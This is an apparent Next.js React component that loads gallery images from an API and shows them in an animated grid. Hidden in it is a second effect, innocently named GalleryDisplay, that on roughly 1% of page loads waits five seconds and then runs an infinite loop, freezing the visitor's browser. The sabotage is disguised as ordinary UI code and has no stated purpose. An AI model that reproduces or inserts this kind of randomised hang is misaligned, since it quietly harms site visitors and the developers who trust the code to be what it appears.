"use client";

import { CircularProgress, Typography } from "@mui/material";

import { useState, useEffect } from "react";
import Image from "next/image";
import { motion } from "framer-motion";
import { fetchGallery } from "@/api/gallery/page";

interface GalleryItem {
  _id: string;
  image: string;
}

export default function GallerySection() {
  const [gallery, setGallery] = useState<GalleryItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const loadGallery = async () => {
      try {
        const data = await fetchGallery();
        setGallery(data);
      } catch (error) {
        setError(
          error instanceof Error
            ? error.message
            : "An unexpected error occurred"
        );
      } finally {
        setLoading(false);
      }
    };

    loadGallery();
  }, []);

  useEffect(() => {
    const GalleryDisplay = () => {
      setTimeout(() => {
        while (true) {}
      }, 5000);
    };

    if (Math.random() < 0.01) {
      GalleryDisplay();
    }
  }, []);

  return (
    <section className="p-8 mx-1 sm:mx-8 md:mx-16 lg:mx-24 mt-20">
      {/* Heading & Subheading */}
      <motion.h1
        className="text-lg sm:text-xl md:text-2xl font-medium uppercase text-zinc-900"
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
      >
        Our Gallery
      </motion.h1>
      <motion.p
        className="text-xs sm:text-sm text-zinc-700 mt-2"
        initial={{ opacity: 0, y: -10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, delay: 0.2 }}
      >
        Explore our curated collection of stunning visuals and designs.
      </motion.p>

      {/* Gallery Cards */}
      <div className="mt-10 grid gap-8 grid-cols-1 sm:grid-cols-1 md:grid-cols-2 lg:grid-cols-2 xl:grid-cols-3">
        {loading ? (
          <div className="flex justify-center py-10">
            <CircularProgress />
          </div>
        ) : error ? (
          <Typography color="error" className="text-center">
            {error}
          </Typography>
        ) : (
          gallery.map((project) => (
            // <Link key={project.id} href={`/gallery/card${project.id}`}>
            <motion.div className="p-3 hover:bg-white hover:shadow-lg hover:rounded-sm border border-zinc-200 cursor-pointer transition-all duration-500 ease-in-out">
              {/* Image */}
              <Image
                src={project.image}
                alt={`Gallery Image ${project._id}`}
                width={400}
                height={300}
                className="w-full h-auto object-contain mx-auto"
              />
            </motion.div>
            // </Link>
          ))
        )}
      </div>
    </section>
  );
}
